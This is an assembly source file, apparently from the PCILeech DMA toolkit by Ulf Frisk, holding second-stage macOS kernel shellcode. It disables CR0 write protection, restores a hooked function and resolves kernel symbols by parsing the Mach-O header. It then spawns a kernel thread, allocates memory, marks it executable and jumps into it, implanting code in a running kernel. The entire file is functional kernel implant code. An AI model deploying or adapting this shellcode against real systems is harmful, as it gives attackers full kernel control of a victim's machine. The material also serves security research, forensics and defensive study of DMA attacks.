; ax64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with OS X.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	main_pre_start:
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_macho_hdr				dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rcx, cr0
	PUSH rcx
	AND ecx, 0fffeffffh
	MOV cr0, rcx
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: LOAD OFFSET TO MACH-O HEADER AND FETCH _IOCreateThread
	; ----------------------------------------------------
	MOV eax, [data_offset_macho_hdr]
	LEA rdi, main
	ADD rdi, rax
	LEA rsi, data_str_IOCreateThread
	CALL macho_parse_find_symbol
	; ----------------------------------------------------
	; 6: SPAWN NEW KERNEL THREAD
	; ----------------------------------------------------
	LEA rdi, setup_threadentry
	ENTER 20h, 0
	CALL rax
	CALL write_enable
	LEAVE
	; ----------------------------------------------------
	; 7: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP rax
	MOV cr0, rax
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

; ----------------------------------------------------
; enable supervisor write in cr0
; ----------------------------------------------------
write_enable PROC
	PUSH rax
	MOV rax, cr0
	AND eax, 0fffeffffh
	MOV cr0, rax
	POP rax
	RET
write_enable ENDP

; ----------------------------------------------------
; clear 8192 bytes of memory
; destroyed registers :: rax, rcx
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV rcx, 1024
	loop_8k:
	MOV [rdi+8*rcx-8], rax
	LOOP loop_8k
	RET
clear_8k ENDP

; ----------------------------------------------------
; setup function called by fresh kernel thread
; REGISTER USAGE:
;  rbx: address of allocated memory (physical)
;  r12: address of allocated memory
;  r13: address of kernel memory map
;  r14: address of next page (used for debug)
;  r15: address of mach-o header
; ----------------------------------------------------
setup_threadentry PROC
	; ----------------------------------------------------
	; 0: INITIALIZE
	; ----------------------------------------------------
	CALL write_enable
	LEA r14, main
	AND r14, 0fffffffffffff000h
	ADD r14, 1000h
	MOV eax, [data_offset_macho_hdr]
	LEA r15, main
	ADD r15, rax
	MOV rax, cr3				; DEBUG
	MOV [r14-8*01h], rax		; DEBUG
	; ----------------------------------------------------
	; 1: IOMallocContigious
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_IOMallocContiguous
	CALL macho_parse_find_symbol
	MOV rdi, 2000h				; param1 = 2 pages of memory
	MOV rsi, 12					; param2 = alignment
	PUSH 0
	MOV rdx, rsp				; param3 = address to place result in
	ENTER 20h, 0
	CALL rax
	LEAVE
	POP rbx
	CALL write_enable
	CMP rax, 0
	JE error
	MOV r12, rax
	MOV [r14-8*03h], rax		; DEBUG
	MOV [r14-8*04h], rbx		; DEBUG
	; ----------------------------------------------------
	; 2: CHECK VALIDITY
	; ----------------------------------------------------
	MOV rax, rbx
	SHR rax, 32
	CMP rax, 0
	JNZ error
	; ----------------------------------------------------
	; 3: CLEAR AND COPY
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rax, 048FFFFFFF1058D48h
	MOV [r12+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r12+1008h], rax
	; ----------------------------------------------------
	; 4: RETRIEVE VM_KERNEL_MAP
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_kernel_map
	CALL macho_parse_find_symbol
	CMP rax, 0
	JZ error
	MOV r13, [rax]
	; ----------------------------------------------------
	; 5: SET PAGE PROTECTION (RX)
	; ----------------------------------------------------
	MOV rdi, r15
	LEA rsi, data_str_vm_protect
	CALL macho_parse_find_symbol
	MOV rdi, r13				; param1 = kernel_map
	MOV rsi, r12				; param2 = address
	ADD rsi, 1000h
	MOV rdx, 1000h				; param3 = size
	MOV rcx, 0					; param4 = set_maximum
	MOV r8, 5					; param4 = READ/EXECUTE
	CALL rax
	CMP rax, 0
	JNE error
	; ----------------------------------------------------
	; 6: SET RETURN POINTER AND JMP TO NEW AREA
	; (thread_handle not set on macos)
	; ----------------------------------------------------
	MOV [r12+8], r15
	MOV [data_phys_addr_alloc], ebx
	MOV rax, r12
	ADD rax, 1000h
	JMP rax
	; ----------------------------------------------------
	; ERROR HANDLER
	; ----------------------------------------------------
	error:
	MOV eax, 0FFFFFFFFh
	MOV [data_phys_addr_alloc], eax
	RET
setup_threadentry ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; LOCATE THE __LINKEDIT END ADDRESS BY SEARCHING THE MACH-O HEADER.
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_linkedit_end_addr PROC
	MOV eax, 0FEEDFACFh			; mach_header_64 magic
	CMP eax, [rdi]
	JNE error
	MOV eax, 01000007h			; mach_header_64 cputype
	CMP eax, [rdi+4]
	JNE error

	XOR rcx, rcx
	MOV rax, 044454B4E494C5F5Fh		; __LINKED
	loop_search_linkedit:
	CMP rax, [rdi+rcx]
	JE success_search_linkedit
	ADD rcx, 4
	CMP rcx, 2000h
	JE error
	JMP loop_search_linkedit

	success_search_linkedit:
	MOV rax, [rdi+rcx+10h]
	ADD rax, [rdi+rcx+18h]
	RET

	error:
	XOR rax, rax
	RET
macho_parse_find_linkedit_end_addr ENDP

; ----------------------------------------------------
; parse mach-o header to find symtab location.
; NB! no sanity checks performed !!!
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symtab PROC
	MOV rcx, rdi
	ADD rcx, 20h
	
	loop_search_symtab:
	MOV eax, 2
	CMP [rcx], eax
	JE success_search_symtab
	MOV eax, [rcx+4]
	ADD rcx, rax
	JMP loop_search_symtab
	
	success_search_symtab:
	MOV rax, rcx
	RET
macho_parse_find_symtab ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN THE MACOS-X KERNEL IMAGE
; Function parses the MACH-O header. The symbol string section
; is located at the end of the __LINKEDIT segment. The function
; table is located just before the symbol string section at the
; end of __LINKEDIT. The size of the function table is found in
; the symtab in the mach-o header.
; destroyed registers :: rcx, r8, r9
; rdi -> macho_header address
; rsi -> ptr to function name
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symbol PROC
	; ecx = counter
	; r8  = symtab_command address
	; r9  = symbol_table_current address
	; r10 = string_table_address
	PUSH r10
	CALL macho_parse_find_symtab
	MOV r8, rax
	CALL macho_parse_find_linkedit_end_addr
	MOV r9, rax
	MOV eax, [r8+14h]		; symtab_command->strsize
	SUB r9, rax
	MOV r10, r9

	; SET UP LOOP
	MOV ecx, [r8+0Ch]		; symtab_command->nsyms
	
	finder_loop:
	SUB r9, 10h
	MOV rax, [r9+08h]
	SHR rax, 32
	CMP eax, 0ffffff80h
	JNE finder_loop_next_or_exit

	MOV edi, [r9]
	ADD rdi, r10
	CALL strcmp_simple
	CMP rax, 0
	JE finder_loop_success

	finder_loop_next_or_exit:
	LOOP finder_loop
	XOR rax, rax
	POP r10
	RET

	finder_loop_success:
	MOV rax, [r9+08h]
	POP r10
	RET 
macho_parse_find_symbol ENDP

data_str_vm_protect					db '_vm_protect', 0
data_str_IOMallocContiguous			db '_IOMallocContiguous', 0
data_str_IOCreateThread				db '_IOCreateThread', 0
data_str_kernel_map					db '_kernel_map', 0

END
